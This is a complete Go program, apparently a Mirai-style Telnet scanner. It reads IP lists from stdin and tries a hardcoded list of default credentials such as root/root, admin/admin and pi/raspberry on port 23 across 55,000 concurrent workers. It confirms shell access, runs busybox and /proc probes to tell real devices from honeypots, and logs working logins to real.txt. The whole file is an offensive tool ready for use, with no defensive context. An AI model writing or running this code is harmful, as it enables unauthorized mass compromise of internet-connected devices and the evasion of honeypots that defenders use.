package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	realSystems int32
	honeypots   int32
	fails       int32
	closedPorts int32
	tasksActive int32
	totalTasks  int32
	mutex       sync.Mutex
	startTime   = time.Now()
	port        int
	debugMode   = false
)

func main() {
	flag.IntVar(&port, "port", 23, "Telnet port to scan (default: 23)")
	flag.BoolVar(&debugMode, "debug", false, "Enable debug mode")
	flag.Parse()

	if debugMode {
		fmt.Printf("[DEBUG] Debug mode enabled, scanning port: %d\n", port)
	}

	targetChan := make(chan string, 55000)
	var wg sync.WaitGroup

	go updateStatus()

	rateLimiter := make(chan struct{}, 55000)
	go func() {
		ticker := time.NewTicker(time.Second / 55000)
		defer ticker.Stop()
		for {
			<-ticker.C
			rateLimiter <- struct{}{}
		}
	}()

	workers := 55000
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(targetChan, rateLimiter, &wg)
	}

	scanner := bufio.NewScanner(os.Stdin)
	count := 0

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) > 0 {
			ip := strings.TrimSpace(parts[0])
			if quickIPCheck(ip) {
				target := fmt.Sprintf("%s:%d", ip, port)
				targetChan <- target
				count++
				atomic.StoreInt32(&totalTasks, int32(count))
			}
		}
	}

	close(targetChan)
	wg.Wait()

	fmt.Printf("\nScan completed. Total: %d | Real Systems: %d | Honeypots: %d | Fails: %d | Closed: %d | Time: %v\n",
		totalTasks, realSystems, honeypots, fails, closedPorts, time.Since(startTime))
}

func quickIPCheck(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		if num, err := strconv.Atoi(part); err != nil || num < 0 || num > 255 {
			return false
		}
	}
	return true
}

func worker(targetChan <-chan string, rateLimiter <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	for target := range targetChan {
		<-rateLimiter
		atomic.AddInt32(&tasksActive, 1)
		testTarget(target)
		atomic.AddInt32(&tasksActive, -1)
	}
}

func testTarget(target string) {
	if !isPortOpen(target) {
		atomic.AddInt32(&closedPorts, 1)
		return
	}

	creds := []struct{ user, pass string }{
		{"root", ""},
		{"root", "root"},
		{"admin", "admin"},
		{"user", "user"},
		{"root", "123456"},
		{"ubnt", "ubnt"},
		{"root", "system"},
		{"root", "password"},
		{"admin", "password"},
		{"postgres", "postgres"},
		{"test", "test"},
		{"", ""},
		{"pi", "raspberry"},
		{"ftp", "ftp"},
		{"user", "password"},
		{"admin", "admin123"},
		{"admin", "admin1234"},
		{"admin", ""},
		{"ubuntu", ""},
		{"root", "1234"},
		{"default", "default"},
	}

	for _, cred := range creds {
		if conn, authenticated := verifyTelnetAccess(target, cred.user, cred.pass); authenticated {
			if isRealSystemTelnet(conn, cred.user, cred.pass) {
				atomic.AddInt32(&realSystems, 1)
				mutex.Lock()
				fmt.Printf("\nREAL-SYSTEM: %s (%s:%s)\n", target, cred.user, cred.pass)
				writeToFile("real.txt", fmt.Sprintf("%s:%s:%s", target, cred.user, cred.pass))
				mutex.Unlock()
			} else {
				atomic.AddInt32(&honeypots, 1)
				mutex.Lock()
				fmt.Printf("\nHONEYPOT: %s (%s:%s)\n", target, cred.user, cred.pass)
				writeToFile("honeypot.txt", fmt.Sprintf("%s:%s:%s", target, cred.user, cred.pass))
				mutex.Unlock()
			}
			conn.Close()
			return
		}
	}
	atomic.AddInt32(&fails, 1)
}

func isPortOpen(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 500*time.Millisecond)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func verifyTelnetAccess(target, user, pass string) (net.Conn, bool) {
	conn, err := net.DialTimeout("tcp", target, 3000*time.Millisecond)
	if err != nil {
		return nil, false
	}

	conn.SetDeadline(time.Now().Add(4000 * time.Millisecond))
	
	buf := make([]byte, 4096)
	
	time.Sleep(200 * time.Millisecond)
	conn.Read(buf)
	
	conn.Write([]byte(user + "\r\n"))
	time.Sleep(300 * time.Millisecond)
	conn.Write([]byte(pass + "\r\n"))
	
	time.Sleep(1000 * time.Millisecond)
	n, _ := conn.Read(buf)
	response := string(buf[:n])
	
	if strings.Contains(response, "$") || strings.Contains(response, "#") || strings.Contains(response, "@") || strings.Contains(response, "~$") || strings.Contains(response, "~]") || strings.Contains(response, "~#") {
		conn.Write([]byte("echo SHELL_TEST\r\n"))
		
		time.Sleep(500 * time.Millisecond)
		n, _ = conn.Read(buf)
		response = string(buf[:n])
		
		if strings.Contains(response, "SHELL_TEST") {
			return conn, true
		}
	}
	
	conn.Close()
	return nil, false
}

func isRealSystemTelnet(conn net.Conn, user, pass string) bool {
	conn.SetDeadline(time.Now().Add(5000 * time.Millisecond))
	
	buf := make([]byte, 4096)
	
	checksPassed := 0
	
	conn.Write([]byte("/bin/busybox TEST\r\n"))
	time.Sleep(600 * time.Millisecond)
	n, _ := conn.Read(buf)
	output := string(buf[:n])
	cleanOutput := strings.TrimSpace(output)
	if strings.Contains(strings.ToLower(cleanOutput), "applet not found") {
		checksPassed++
	} else {
		return false
	}
	
	conn.Write([]byte("cat /proc\r\n"))
	time.Sleep(600 * time.Millisecond)
	n, _ = conn.Read(buf)
	output = string(buf[:n])
	cleanOutput = strings.TrimSpace(output)
	if strings.Contains(strings.ToLower(cleanOutput), "cat:") || strings.Contains(strings.ToLower(cleanOutput), "no such file") || strings.Contains(strings.ToLower(cleanOutput), "is a directory") {
		checksPassed++
	} else {
		return false
	}
	
	conn.Write([]byte("./\r\n"))
	time.Sleep(600 * time.Millisecond)
	n, _ = conn.Read(buf)
	output = string(buf[:n])
	cleanOutput = strings.TrimSpace(output)
	lowerOutput := strings.ToLower(cleanOutput)
	
	if strings.Contains(lowerOutput, "permission denied") || strings.Contains(lowerOutput, "cannot execute") || strings.Contains(lowerOutput, "is a directory") || strings.Contains(lowerOutput, "not a directory") {
		checksPassed++
	} else if strings.Contains(lowerOutput, "command not found") || strings.Contains(lowerOutput, "no such file") || len(cleanOutput) < 10 {
		return false
	} else {
		return false
	}
	
	return checksPassed == 3
}

func updateStatus() {
	for {
		time.Sleep(2 * time.Second)
		active := atomic.LoadInt32(&tasksActive)
		total := atomic.LoadInt32(&totalTasks)
		real := atomic.LoadInt32(&realSystems)
		hp := atomic.LoadInt32(&honeypots)
		f := atomic.LoadInt32(&fails)
		cp := atomic.LoadInt32(&closedPorts)

		elapsed := time.Since(startTime)
		completed := real + hp + f + cp
		rate := float64(completed) / elapsed.Seconds()

		fmt.Printf("\rActive: %d | Total: %d | Real: %d | Honeypots: %d | Fails: %d | Closed: %d | Rate: %.1f/s",
			active, total, real, hp, f, cp, rate)
	}
}

func writeToFile(filename, data string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(data + "\n")
}